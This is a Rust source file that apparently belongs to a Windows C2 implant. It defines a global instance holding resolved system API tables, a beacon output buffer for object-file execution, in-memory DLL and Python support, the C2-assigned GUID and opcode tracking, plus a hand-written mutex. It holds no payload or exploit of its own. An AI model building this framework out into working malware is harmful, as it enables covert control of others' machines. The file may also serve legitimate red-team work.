use alloc::string::String;
use alloc::vec::Vec;

#[cfg(feature = "network")]
use super::winhttp::Winhttp;
#[cfg(feature = "frida")]
use super::frida::FridaApi;
#[cfg(feature = "ad")]
use super::ldap32::Ldap32;
#[cfg(any(feature = "ad", feature = "user"))]
use super::netapi32::Netapi32;
use super::k32::Kernel32;
use super::ntapi::NtDll;
#[cfg(feature = "network")]
use super::winsock::Winsock;
use super::advapi::Advapi32;
#[cfg(feature = "execution")]
use super::ole::Ole32;
#[cfg(feature = "bof")]
use crate::libs::coffee::beacon_api::BeaconOutputBuffer;
use core::ptr::null_mut;
use crate::get_instance;
use core::cell::UnsafeCell;
use core::ffi::c_void;

/// Tracks a named allocation (DLLs, memory regions, etc.)
#[derive(Clone)]
pub struct TrackedAlloc {
    pub name: String,
    pub base: *mut c_void,
    pub size: usize,
}

/// Python API function pointers (for in-memory Python)
#[cfg(feature = "python")]
pub struct PythonApi {
    // List operations
    pub list_new: Option<unsafe extern "C" fn(isize) -> *mut c_void>,
    pub list_append: Option<unsafe extern "C" fn(*mut c_void, *mut c_void) -> i32>,
    // Dict operations
    pub dict_new: Option<unsafe extern "C" fn() -> *mut c_void>,
    pub dict_set_item_string: Option<unsafe extern "C" fn(*mut c_void, *const u8, *mut c_void) -> i32>,
    // Type conversions
    pub long_from_long: Option<unsafe extern "C" fn(i64) -> *mut c_void>,
    pub unicode_from_string: Option<unsafe extern "C" fn(*const u8) -> *mut c_void>,
    pub bytes_from_string_and_size: Option<unsafe extern "C" fn(*const u8, isize) -> *mut c_void>,
    pub bool_from_long: Option<unsafe extern "C" fn(i64) -> *mut c_void>,
    // Argument parsing
    pub tuple_get_item: Option<unsafe extern "C" fn(*mut c_void, isize) -> *mut c_void>,
    pub tuple_size: Option<unsafe extern "C" fn(*mut c_void) -> isize>,
    pub arg_parse_tuple: Option<unsafe extern "C" fn(*mut c_void, *const u8, ...) -> i32>,
    pub unicode_as_utf8: Option<unsafe extern "C" fn(*mut c_void) -> *const u8>,
    pub bytes_as_string: Option<unsafe extern "C" fn(*mut c_void) -> *const u8>,
    pub bytes_size: Option<unsafe extern "C" fn(*mut c_void) -> isize>,
    pub long_as_long: Option<unsafe extern "C" fn(*mut c_void) -> i64>,
    // Error handling
    pub err_set_string: Option<unsafe extern "C" fn(*mut c_void, *const u8)>,
    pub err_clear: Option<unsafe extern "C" fn()>,
    pub exc_runtime_error: *mut c_void,
    // Singletons
    pub py_none: *mut c_void,
    pub py_true: *mut c_void,
    pub py_false: *mut c_void,
}

#[cfg(feature = "python")]
impl PythonApi {
    pub fn new() -> Self {
        PythonApi {
            list_new: None,
            list_append: None,
            dict_new: None,
            dict_set_item_string: None,
            long_from_long: None,
            unicode_from_string: None,
            bytes_from_string_and_size: None,
            bool_from_long: None,
            tuple_get_item: None,
            tuple_size: None,
            arg_parse_tuple: None,
            unicode_as_utf8: None,
            bytes_as_string: None,
            bytes_size: None,
            long_as_long: None,
            err_set_string: None,
            err_clear: None,
            exc_runtime_error: null_mut(),
            py_none: null_mut(),
            py_true: null_mut(),
            py_false: null_mut(),
        }
    }
}

#[repr(C)]
// The main structure holding system API modules and the magic value
pub struct Instance {
    pub magic: u32,       // Unique value to identify a valid instance
    pub k32: Kernel32,    // Kernel32 API functions
    pub advapi: Advapi32,
    pub ntdll: NtDll,     // NtDll API functions
    #[cfg(feature = "network")]
    pub winsock: Winsock, // Winsock API functions
    #[cfg(feature = "execution")]
    pub ole: Ole32, // Ole32 API functions
    #[cfg(feature = "ad")]
    pub ldap: Ldap32, // Ldap32 API functions
    #[cfg(any(feature = "ad", feature = "user"))]
    pub netapi: Netapi32, // Netapi32 API functions
    #[cfg(feature = "bof")]
    pub beacon_buffer: Mutex<BeaconOutputBuffer>,
    #[cfg(feature = "network")]
    pub winhttp: Winhttp,
    #[cfg(feature = "frida")]
    pub frida: FridaApi,
    pub allocations: Vec<TrackedAlloc>, // Tracked allocations (DLLs, memory, etc.)
    #[cfg(feature = "python")]
    pub python: PythonApi, // Python API functions
    pub service_status_handle: *mut c_void, // Service control status handle
    pub service_name: Vec<u16>, // Service name for service control registration
    pub results_buffer: Option<Vec<u8>>, // Accumulated results when in C2 mode (listener/beacon)
    pub thread_handle: *mut c_void, // Handle to the agent's main thread (for kill)
    pub c2_guid: Option<String>, // GUID assigned by C2 server after check-in
    pub current_opcode: u8, // Current opcode being executed (for result tagging)
}

impl Instance {
    pub fn new(magic: u32) -> Self {
        Instance {
            magic: magic,
            k32: Kernel32::new(),
            advapi: Advapi32::new(),
            ntdll: NtDll::new(),
            #[cfg(feature = "network")]
            winsock: Winsock::new(),
            #[cfg(feature = "execution")]
            ole: Ole32::new(),
            #[cfg(feature = "ad")]
            ldap: Ldap32::new(),
            #[cfg(any(feature = "ad", feature = "user"))]
            netapi: Netapi32::new(),
            #[cfg(feature = "bof")]
            beacon_buffer: Mutex::new(BeaconOutputBuffer::new()),
            #[cfg(feature = "network")]
            winhttp: Winhttp::new(),
            #[cfg(feature = "frida")]
            frida: FridaApi::new(),
            allocations: Vec::new(),
            #[cfg(feature = "python")]
            python: PythonApi::new(),
            service_status_handle: null_mut(),
            service_name: Vec::new(),
            results_buffer: None,
            thread_handle: null_mut(),
            c2_guid: None,
            current_opcode: 0,
        }
    }
}

// An implementation of mutex using the Windows API because I wasted tones of time trying to figure out no-std mutexes
pub struct Mutex<T> {
    data: UnsafeCell<T>,
    handle: *mut c_void,
    initialized: bool
}

unsafe impl<T: Send> Send for Mutex<T> {}
unsafe impl<T: Send> Sync for Mutex<T> {}

impl<T> Mutex<T> {
    pub const fn new(data: T) -> Self {
        Mutex {
            data: UnsafeCell::new(data),
            handle: null_mut(),
            initialized: false,
        }
    }

    pub fn initialize(&mut self) {
        let handle =
            unsafe { (get_instance().unwrap().k32.create_mutex_a)(null_mut(), 0, null_mut()) };
        self.handle = handle;
    }

    pub fn lock(&mut self) -> MutexGuard<T> {
        if !self.initialized {
            self.initialize();
            self.initialized = true;
        }
        unsafe {
            (get_instance().unwrap().k32.wait_for_single_object)(self.handle, 0xffffffff);
        }
        MutexGuard::<T> { mutex: self }
    }
}

impl<T> Drop for Mutex<T> {
    fn drop(&mut self) {
        unsafe {
            (get_instance().unwrap().k32.close_handle)(self.handle);
        }
    }
}

pub struct MutexGuard<'a, T> {
    mutex: &'a Mutex<T>,
}

impl<'a, T> core::ops::Deref for MutexGuard<'a, T> {
    type Target = T;

    fn deref(&self) -> &Self::Target {
        unsafe { &*self.mutex.data.get() }
    }
}

impl<'a, T> core::ops::DerefMut for MutexGuard<'a, T> {
    fn deref_mut(&mut self) -> &mut Self::Target {
        unsafe { &mut *self.mutex.data.get() }
    }
}

impl<'a, T> Drop for MutexGuard<'a, T> {
    fn drop(&mut self) {
        unsafe {
            (get_instance().unwrap().k32.release_mutex)(self.mutex.handle);
        }
    }
}
